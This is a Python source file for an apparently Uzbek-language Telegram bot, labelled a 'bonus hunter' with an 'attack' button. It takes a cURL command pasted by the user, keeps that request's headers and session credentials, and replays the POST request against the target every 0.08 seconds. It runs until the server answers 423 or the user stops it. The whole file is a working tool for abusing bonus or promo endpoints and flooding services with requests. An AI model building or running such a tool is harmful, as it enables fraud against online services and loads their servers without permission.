from flask import Flask
import threading
import telebot
from telebot import types
import requests
import time
import os
import re
import json

# Tokenni Render'dan oladi
BOT_TOKEN = os.getenv("BOT_TOKEN")
bot = telebot.TeleBot(BOT_TOKEN)
app = Flask('')

@app.route('/')
def home():
    return "Bot yoniq va nazorat ostida!"

def run_web():
    app.run(host='0.0.0.0', port=8080)

# Foydalanuvchilar ma'lumotlarini saqlash
users_data = {}
# Parallel oqimlarni nazorat qilish uchun qulf (Lock)
lock = threading.Lock()

def get_main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn1 = types.KeyboardButton("🚀 Hujumni boshlash")
    btn2 = types.KeyboardButton("🛑 To'xtatish")
    btn3 = types.KeyboardButton("⚙️ Sozlamalarni ko'rish")
    markup.add(btn1, btn2, btn3)
    return markup

def parse_curl(curl_text):
    try:
        url_match = re.search(r"curl\s+'([^']+)'", curl_text)
        url = url_match.group(1) if url_match else None
        headers = {}
        header_matches = re.findall(r"-H\s+'([^:]+):\s*([^']+)'", curl_text)
        for k, v in header_matches:
            headers[k.strip()] = v.strip()
        data = None
        data_match = re.search(r"--data-raw\s+'([^']+)'", curl_text)
        if data_match:
            data = json.loads(data_match.group(1))
        if url and headers:
            return {"url": url, "headers": headers, "data": data, "is_running": False}
    except Exception:
        return None
    return None

def attack(chat_id):
    user = users_data.get(chat_id)
    if not user:
        return
    
    # Hujum boshlanishida is_running kafolatlanadi
    while user.get("is_running"):
        try:
            # timeout=5 so'rov osilib qolmasligi uchun
            response = requests.post(user["url"], headers=user["headers"], json=user["data"], timeout=5)
            
            if response.status_code == 423:
                bot.send_message(chat_id, "⚠️ Limit tugadi (423). Hujum to'xtatildi.")
                user["is_running"] = False
                break
            
            # Agar foydalanuvchi "To'xtatish"ni bossa, darhol sikldan chiqish
            if not user.get("is_running"):
                break
                
        except Exception:
            time.sleep(1) # Xato bo'lsa biroz kutish
            continue
        
        time.sleep(0.08) # Optimal tezlik

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(
        message.chat.id, 
        "👋 **Bonus ovchisi** qayta tiklandi!\n\nEndi hujumlar qat'iy nazorat ostida. cURL yuboring:",
        reply_markup=get_main_menu(),
        parse_mode="Markdown"
    )

@bot.message_handler(func=lambda message: message.text.startswith("curl "))
def handle_curl(message):
    parsed = parse_curl(message.text)
    if parsed:
        users_data[message.chat.id] = parsed
        bot.reply_to(message, "✅ cURL qabul qilindi!")
    else:
        bot.reply_to(message, "❌ cURL noto'g'ri.")

@bot.message_handler(func=lambda message: message.text in ["🚀 Hujumni boshlash", "🛑 To'xtatish", "⚙️ Sozlamalarni ko'rish"])
def handle_menu(message):
    chat_id = message.chat.id
    user = users_data.get(chat_id)

    if message.text == "🚀 Hujumni boshlash":
        if not user:
            bot.send_message(chat_id, "Oldin `cURL` yuboring!")
            return
        
        # ASOSIY TO'G'IRLASH: Parallel oqim ochilishini cheklash
        with lock:
            if user.get("is_running"):
                bot.send_message(chat_id, "⚠️ Hujum allaqachon ketyapti! Parallel oqim ochish bloklandi.")
                return
            user["is_running"] = True
        
        # Daemon=True bot to'xtaganda oqimni ham yopadi
        threading.Thread(target=attack, args=(chat_id,), daemon=True).start()
        bot.send_message(chat_id, "🚀 Hujum boshlandi!")

    elif message.text == "🛑 To'xtatish":
        if user and user.get("is_running"):
            user["is_running"] = False
            bot.send_message(chat_id, "🛑 To'xtatish buyrug'i yuborildi. ✅")
        else:
            bot.send_message(chat_id, "Hozir hech qanday hujum ketmayapti.")

    elif message.text == "⚙️ Sozlamalarni ko'rish":
        if user:
            bot.send_message(chat_id, f"📊 Holat: {'Ishlamoqda 🟢' if user['is_running'] else 'To\'xtatilgan 🔴'}")
        else:
            bot.send_message(chat_id, "Ma'lumot yo'q.")

if __name__ == "__main__":
    threading.Thread(target=run_web, daemon=True).start()
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception:
            time.sleep(5)
